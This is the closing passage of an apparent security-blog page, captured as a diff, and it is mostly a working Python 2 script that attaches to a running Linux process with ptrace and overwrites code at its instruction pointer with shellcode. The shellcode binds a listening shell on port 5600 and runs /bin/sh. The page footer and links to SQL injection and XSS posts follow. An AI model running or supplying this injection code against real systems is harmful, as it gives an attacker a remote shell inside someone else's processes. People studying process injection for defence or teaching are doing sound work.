+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rcx&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rdx&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rsi&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rdi&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;orig_rax&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rip&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;cs&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;eflags&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;rsp&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;ss&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;fs_base&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;gs_base&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;ds&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;es&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;fs&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>        (<span style="color:#e6db74">&#34;gs&#34;</span>, ctypes<span style="color:#f92672">.</span>c_ulonglong),
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>pid<span style="color:#f92672">=</span>int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Define argument type and respone type.</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_uint64, ctypes<span style="color:#f92672">.</span>c_uint64, ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>c_void_p]
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_uint64
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Attach to the process</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace(PTRACE_ATTACH, pid, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>)
+</span></span><span style="display:flex;"><span>registers<span style="color:#f92672">=</span>user_regs_struct()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Retrieve the value stored in registers</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace(PTRACE_GETREGS, pid, <span style="color:#66d9ef">None</span>, ctypes<span style="color:#f92672">.</span>byref(registers))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Instruction Pointer: &#34;</span> <span style="color:#f92672">+</span> hex(registers<span style="color:#f92672">.</span>rip))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Injecting Shellcode at: &#34;</span> <span style="color:#f92672">+</span> hex(registers<span style="color:#f92672">.</span>rip))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Inject the shellcode into the running process byte by byte.</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,len(shellcode),<span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Convert the byte to little endian.</span>
+</span></span><span style="display:flex;"><span>    shellcode_byte_int<span style="color:#f92672">=</span>int(shellcode[i:<span style="color:#ae81ff">4</span><span style="color:#f92672">+</span>i]<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;hex&#39;</span>),<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>    shellcode_byte_little_endian<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, shellcode_byte_int)<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;hex&#39;</span>)
+</span></span><span style="display:flex;"><span>    shellcode_byte<span style="color:#f92672">=</span>int(shellcode_byte_little_endian,<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Inject the byte.</span>
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>ptrace(PTRACE_POKETEXT, pid, ctypes<span style="color:#f92672">.</span>c_void_p(registers<span style="color:#f92672">.</span>rip<span style="color:#f92672">+</span>i),shellcode_byte)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Shellcode Injected!!&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Modify the instuction pointer</span>
+</span></span><span style="display:flex;"><span>registers<span style="color:#f92672">.</span>rip<span style="color:#f92672">=</span>registers<span style="color:#f92672">.</span>rip<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set the registers</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace(PTRACE_SETREGS, pid, <span style="color:#66d9ef">None</span>, ctypes<span style="color:#f92672">.</span>byref(registers))
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Final Instruction Pointer: &#34;</span> <span style="color:#f92672">+</span> hex(registers<span style="color:#f92672">.</span>rip))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Detach from the process.</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>ptrace(PTRACE_DETACH, pid, <span style="color:#66d9ef">None</span>, <span style="color:#66d9ef">None</span>)
+</span></span></code></pre></div></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://www.hzhsec.top/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>MySQL：增删改查与盲注技巧</span></a>
+    
+    
+    <a class="next" href="http://www.hzhsec.top/list/base_bug/xss/xss4/"><span>XSS 跨站 — 安全防御：CSP / HttpOnly / XSS Filter</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
+    Powered by
+    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
+    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
+️  </p>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
+    </svg>
+</a>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copied';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
